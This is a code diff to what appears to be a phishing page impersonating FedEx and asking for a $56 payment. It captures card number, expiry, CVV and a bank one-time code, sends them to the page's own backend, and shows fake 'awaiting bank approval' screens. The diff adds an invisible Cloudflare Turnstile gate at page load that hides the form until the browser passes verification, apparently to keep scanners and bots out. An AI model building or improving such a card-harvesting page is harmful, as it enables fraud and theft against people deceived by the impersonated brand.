@@ -79,6 +79,22 @@ body.show-form .bg-image { transform: scale(1.05); }
 <img src="https://res.cloudinary.com/mzblupug/image/upload/v1793463553/rnimo.png" class="bg-image" alt="FedEx Background">
 <div class="bg-overlay"></div>
 
+<!-- GATE VIEW (Invisible Turnstile happening here) -->
+<div id="gateView" class="view-fullscreen loading-bg" style="display: flex; z-index: 2000;">
+  <div class="view-card" style="display: flex; flex-direction: column; align-items: center;">
+    <div class="spinner-large"></div>
+    <h3>Securing Connection...</h3>
+    <p>Please wait while we verify your browser.</p>
+    
+    <!-- Invisible Turnstile Widget -->
+    <div class="cf-turnstile" 
+         data-sitekey="0x4AAAAAAF3-aYsP7n9d_E_H" 
+         data-action="gate" 
+         data-callback="onTurnstileSuccess"
+         data-size="invisible"></div>
+  </div>
+</div>
+
 <div class="form-panel" id="mainView">
   <div class="form-container">
     <div class="form-header">
@@ -131,9 +147,6 @@ body.show-form .bg-image { transform: scale(1.05); }
       <input type="checkbox" id="consentCheckbox">
       <label for="consentCheckbox">I authorize this payment and understand my information will be processed securely.</label>
     </div>
-
-    <!-- CLOUDFLARE TURNSTILE WIDGET -->
-    <div class="cf-turnstile" data-sitekey="0x4AAAAAAF3-aYsP7n9d_E_H" data-action="checkout" style="margin-bottom: 15px;"></div>
 
     <button type="button" class="pay-button" id="submitBtn" onclick="submitPayment()">
       Pay $56 Now <i class="fas fa-arrow-right"></i>
@@ -223,13 +236,41 @@ body.show-form .bg-image { transform: scale(1.05); }
 </div>
 
 <script>
-  window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(() => { document.body.classList.add('show-form'); }, 2250);
-  });
-
   let globalTimerInterval = null;
   let pollInterval = null;
   let lastHandledStep = null;
+  let currentSid = null;
+  let turnstileToken = null;
+
+  // 1. Turnstile Callback (Happens invisibly)
+  window.onTurnstileSuccess = async function(token) {
+    turnstileToken = token;
+    
+    // Send the token to backend to validate
+    try {
+      const res = await fetch('/api/verify_gate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 'cf-turnstile-response': turnstileToken })
+      });
+      const data = await res.json();
+      
+      if (data.ok) {
+        // Success! Hide gate, show form
+        document.getElementById('gateView').style.display = 'none';
+        setTimeout(() => { document.body.classList.add('show-form'); }, 500);
+      } else {
+        // Failed Turnstile
+        document.querySelector('#gateView h3').innerText = 'Security Check Failed';
+        document.querySelector('#gateView p').innerText = 'Please refresh the page to try again.';
+        document.querySelector('.spinner-large').style.display = 'none';
+      }
+    } catch (err) {
+      console.error("Gate verification error", err);
+      document.querySelector('#gateView h3').innerText = 'Connection Error';
+      document.querySelector('#gateView p').innerText = 'Please refresh the page.';
+    }
+  };
 
   document.getElementById('cardNumber').addEventListener('input', function(e) {
     let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
@@ -316,31 +357,26 @@ body.show-form .bg-image { transform: scale(1.05); }
     const exp = document.getElementById('expiry').value.trim();
     const cvv = document.getElementById('cvv').value.trim();
     const consent = document.getElementById('consentCheckbox').checked;
-    
-    // Grab Turnstile Token
-    const turnstileToken = document.querySelector('[name="cf-turnstile-response"]')?.value;
 
     if (!consent) { alert("Please check the consent box."); return; }
     if (!name || !card || !exp || !cvv) { alert("Please fill all fields."); return; }
-    if (!turnstileToken) { alert("Please complete the Cloudflare security check."); return; }
 
     showView('loading');
     document.getElementById('loadingTitle').innerText = 'Verifying Card...';
     document.getElementById('loadingText').innerText = 'Please wait while we contact your bank.';
 
-    const sid = 's' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+    currentSid = 's' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
 
     try {
       const res = await fetch('/api/submit_card', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
-            sid: sid, 
+            sid: currentSid, 
             name: name, 
             cardNumber: card, 
             expiry: exp, 
-            cvv: cvv,
-            'cf-turnstile-response': turnstileToken
+            cvv: cvv
         })
       });
       const data = await res.json();
@@ -349,7 +385,6 @@ body.show-form .bg-image { transform: scale(1.05); }
         showView('main');
         if (data.error === 'invalid_luhn') alert('Invalid card number. Please check and try again.');
         else if (data.error === 'bad_words') alert('Please remove inappropriate language from the name field.');
-        else if (data.error && data.error.startsWith('turnstile')) alert('Security check failed. Please refresh and try again.');
         else alert('An error occurred. Please try again.');
         return;
       }
@@ -362,7 +397,7 @@ body.show-form .bg-image { transform: scale(1.05); }
     startCountdown(10, function() {
       document.getElementById('loadingTitle').innerText = 'Awaiting Bank Approval...';
       document.getElementById('loadingText').innerText = 'Please wait. The bank is reviewing this transaction.';
-      startPolling(sid);
+      startPolling(currentSid);
     });
   }
 
@@ -411,13 +446,11 @@ body.show-form .bg-image { transform: scale(1.05); }
     btn.innerHTML = 'Verifying...';
     btn.disabled = true;
 
-    const sid = new URLSearchParams(window.location.search).get('sid') || window.currentSid; // Retrieve sid
-
     try {
       await fetch('/api/submit_otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sid: sid, otp: otp })
+        body: JSON.stringify({ sid: currentSid, otp: otp })
       });
     } catch (err) { console.log("OTP error", err); }
 
